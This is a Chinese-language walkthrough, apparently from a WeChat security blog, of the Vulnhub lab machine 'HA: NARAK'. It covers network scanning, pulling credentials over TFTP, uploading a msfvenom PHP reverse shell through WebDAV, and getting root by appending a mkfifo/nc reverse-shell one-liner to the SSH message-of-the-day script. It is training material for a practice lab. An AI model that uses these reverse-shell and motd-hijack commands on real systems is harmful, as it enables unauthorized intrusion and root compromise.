原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/PD-wJMdHO0a6\_m5-3iPpkA)

**【JDICSP 小分享第二十二期】** 
======================

前言：
===

Vulnhub 是一个提供各种漏洞环境的靶场，每个镜像会有破解的目标，挑战的目标是通过网络闯入系统获取 root 权限和查看 flag

说明：
---

**这次选择的靶场名字为：HA: NARAK**
------------------------

靶场下载链接：https://download.vulnhub.com/ha/narak.ova

个人建议在 vmware 运行靶场环境，再使用 kali 或者终端机器作为攻击主机，同时要注意 kali 在同一网卡下，否则是无法进行通信的。

题目的描述为：

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMag2WZkRbQ8wjibYulR5WIWDZicVTwTWZicPTQafZ5t3waB2EpO3UhJbj8g/640?wx_fmt=png)

为了让更多新手朋友少走弯路，我尽量写详细一点，如果有什么不清楚的地方可以对我们发起提问

开始：
---

在这里我让 kali 和靶场都使用 NAT 模式

在编辑 -> 虚拟网络编辑器处可以看到我们使用模式的配置。

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaoqwI1dp5ZnH0RIKW5Dghc1Q9PkN8ovcGJMlJhNIQGwFzeFUgI2ToUw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaicplYRyS1diawOfBgoklNUaLNEsWOlYJVaMpjHic2WUAb0Wia1c5mKHjvw/640?wx_fmt=png)

Ip 地址段都为 192.168.158.\*

目标主机：未知 ip

既然知道 ip 段，不知道 IP，我们可与使用 nmap 去扫描整个 c 段来探测主机

使用命令：Nmap -sS -Pn 192.168.158.0/24

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaWRBHcwzhhMfBCMHl8jGPcm3Qhro59Inc7s4B22XPqXTvYym6hRNE1w/640?wx_fmt=png)

发现 192.168.158.142 开放了 80 和 22

那我们所需要渗透的靶场就为 192.168.158.142 了

虽然使用 nmap -sS -Pn ip 这个扫描会虽然速度很快，不过很多端口会扫描不出来

我们可以使用命令：nmap -T4 -A -v-p 1-65535 ip 去详细对目标扫描一下

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaZv8PyNd6TeHyNYelRspzmaOick0icrbU9o1nJUDHsthANRkmoMQWhJvg/640?wx_fmt=png)

使用 udp 进行端口扫描，命令：nmap-sU -Pn 192.168.158.142

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaeMxbibGicNIcLExQhVCM6JjP5puBIVtiaHIbQichdA48IkdjbwRgbtsIOA/640?wx_fmt=png)

一共开放了 4 个端口，80 端口的 web，22 端口的 ssh，69 的 tftp 和 68 的 dhcpc

其中 80 开放 http 服务

我们先访问一下 80 吧

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaxLY9sa9icCZh2dkdI54M7ocPQat1KMlAdeibBHctnR7xBUkk0jhUPa0w/640?wx_fmt=png)

使用 google 的 wappalyzer 插件查看一下是否有框架信息

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaOPZ2aFTVR15R1LMQhjqcPql9sk5osuQ90HvW9fNHZrCaWBGWRia1N7Q/640?wx_fmt=png)

并没有得到网站开发的框架，但可以知道网站的 apche 的版本和 ubuntu 的操作系统

这时我们可以对目标进行目录扫描：

先使用 dirscan 进行扫描

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaXmGjpFTL8VGlljN4awZhqMsEskXcWlB2KTCKMqRtiaDTFPhZzkqYQEQ/640?wx_fmt=png)

访问 / webdav

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaTfdeNMtWicZiaOiaePXw1ky9miaZpZS7eaRZbDGKtFfGmNFuSk6lNjBmTw/640?wx_fmt=png)

由于我们没有账号信息，想要爆破起来比较困难，我们对目标继续信息收集。

使用 7kbscan 对目标扫描其他的扩展

最终在找到一个 txt 文件

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaMHUjwk9T8uNUf56vW4ia3O2klrTAGBsHXtNvsjkd57YS39jXXsw4hyA/640?wx_fmt=png)

访问一下

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMa3jvOD95Da0NPWDNyBXWb4O29vGiavdCLW5YkjP34Crp9icE75ibEsxyCA/640?wx_fmt=png)

提示我们关键的文件在 creds.txt 里

看来我们需要找到 creads.txt 文件，但是扫描都没发现这个文件

猜测可能是存在 tftp 中的

我们开启一下 tftp 服务（控制面板 -> 程序 -> 启动或者关闭 window 功能）

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMagU66skX9ic8IXUUo74XI0WaN4re7DFwTbSgCxhsl2329ap94JpF6fQw/640?wx_fmt=png)

使用 cmd

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMalKyfoJibhfXiaoaHuxmS5LZP71mWHeR0fich5tcwVhtBbN3knMkTAbyKQ/640?wx_fmt=png)

使用命令: tftp -i 192.168.158.142 get creds.txt 果然存在

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMasmZCuiax11oAgxXRnwOjyic8caxtVReath4HdbV69iabTibva6ldBlat3g/640?wx_fmt=png)

打开发现是一串 base64

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMacjDljg1ZC0daicMiavRusm5DaOeBsazNx3SxEyTjlK8eSgXjwgVt2FfA/640?wx_fmt=png)

解密一下

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMa6Xuc9aH9wuJic4paQiaVhVW05l8tSCR496S81oc95XMgcRxL9SKvVCFA/640?wx_fmt=png)

解密得到为：yamdoot:Swarg

这应该就是 webdav 的账号和密码了

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMa6ERzTNxwOkFrNwenToVlIChichqGpFiaiaTO3gwafEhgjbWef1nRHXyiaA/640?wx_fmt=png)

成功连接

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaGBxwBv7GWibCSOVIMwRoKIoYJWtGmJCNJ6bKQ0LFqKiaKSJj4tOk28TQ/640?wx_fmt=png)

可以发现我们是可以通过 webdav 上传文件的

接着我们使用 kali 的 cadaver 去连接 webdav

使用命令：cadaver http://192.168.158.142/webdav

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMag04gt8crPIXsxwqYhLibXFsrmibsAJMibibPxkYMgRVickMn5dELlic3IKNg/640?wx_fmt=png)

由于这里是需要登录 webdav 所以我们需要上传能反弹 shell 的木马文件

这里使用 kali 生成一个 msf 的 php 马，命令：

msfvenom -pphp/meterpreter\_reverse\_tcp LHOST=xxx LPORT=xxx -f raw > shell.php

kali 进行监听

命令：

use exploit/multi/handler

set payloadphp/meterpreter\_reverse\_tcp

php/meterpreter\_reverse\_tcp

set lhost 192.168.158.132

192.168.158.132

set lport 8888

run

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaYw8kxBLia9KAm4DKqwzic1jDpibrcEDbjrUB7EkA3iaRAE1Zyfd524fL3g/640?wx_fmt=png)

再上传生成的木马文件

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMafYKYAmUkicSuWNN8E1yrwFebAqvBWN40yvqDsaITWeSgftKmXFGCDpg/640?wx_fmt=png)

访问 msf.php

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaD7ygYaUtYdhfkeOOpNOe6cVBrHyFRtOSWg6CXicSwcc3SqlQhamSPUw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaygCgrIjDS9910vmqqzvaSpyibAjUibu84IBRbKnric9KSZpvRnlzAP8rQ/640?wx_fmt=png)

成功拿到 meterperter

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMa9y9JfKI1qgHAFlXAyk8YMUKK40EsCHD1qSouGYkOQuqiamXUZMLicpqw/640?wx_fmt=png)

权限比较低

查看内核

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaTvxB4cohRLrcvIuwX5yq5dLC0wCa2NC8AFVg729zYSYSTH8r3PbSmg/640?wx_fmt=png)

使用 searchsploit 查看是否有可以提权的脚本

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaaXFBmQ3KRFp3Q4Rz6ibsvrhXBrhR5e6fqliaul3B8sDxdazkTiaek5Urg/640?wx_fmt=png)

没有发现利用的脚本，看来提权得翻文件了

在 / home/inferno 目录中找到了 user.txt

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMal1IpFC7Wyg9xIoBGWLZb2vkz2x1oriceUjtMZfKePVoAoib4JbEJHHVQ/640?wx_fmt=png)

在 home 目录中可以发现还存在 2 个用户

我们还需要找到 root.txt, 这个文件估计需要我们提权了

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMajibrClOGayGRjxhCZicPH41L6ZH2hc1NepEOWGunyJr71aZFRN1gvkiaA/640?wx_fmt=png)

Yamdoot 应该是 TFPT 用户，narak 我们访问不了，应该为高权限账号

继续翻文件

在 / mnt 目录发现一段密文

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaicZW49fMyHibsFaD0ot9tbKlL8gY1Yd7AKnZ4UhpkzmH4Ecyn67qIg2g/640?wx_fmt=png)

百度可以得到为 brainfuck

使用 brainfuck 在线解密

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaOmxzk4icyxqlGW6Zzb5hLT15MvcjKuVJA3RB6ZNrUf57Nt9QJj0Lo3Q/640?wx_fmt=png)

得到 chitragupt，感觉可能是某个账号的密码

我们对 3 个账号进行尝试

使用 inferno/chitragupt 登录成功

接着我们可以上传 linpeas 来查找可供我们提权的文件

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaPpLn7gjPvnZRxLPfeIhDdaFCT6hYvBKgEDosAKsAv5h4rz21GjdSmA/640?wx_fmt=png)

/etc/motd 欢迎界面 我们可以通过修改 ssh 登陆时的欢迎信息来反弹一个 root 的 shell 使用命令 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i2>&1|nc 192.168.158.132 1234 >/tmp/f" >>/etc/update-motd.d/00-header
===================================================================================================================================================================================

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMacX9NLM0kyX4Q3896iaNnMAZhe5LOoM9eEnk3E85bfm1XaDJAtpcIrnw/640?wx_fmt=png)

接着 kali 使用 nc 监听

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaw627G4OT1bQU1xcedfa4MGDtJzFBvXBL8GPQiaGJcFERbMRzSOqg6GA/640?wx_fmt=png)

重新登录

Nc 成功接收到 root

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMa4cD8Xy9PyvDh46E8Dic1CWXoC97bXiaZKKcTScvXs2raQmzPvdGLDictA/640?wx_fmt=png)

最后 cat ./root.txt 得到最终的 flag

![](https://mmbiz.qpic.cn/mmbiz_png/mqpmeNib9RZStsibgMBFrQY0D7HP06GeMaqEV2gqONfhjd7FfD8Zw1SXnVGkQ0Se5JpvFQxoO56v2aEPJdpwaV7g/640?wx_fmt=png)

总结：
---

Vulnhub 还是挺有意思的，能够掌握很多渗透的技巧，我们后续我们会继续更新新的靶场文章，希望能给大家一点帮助。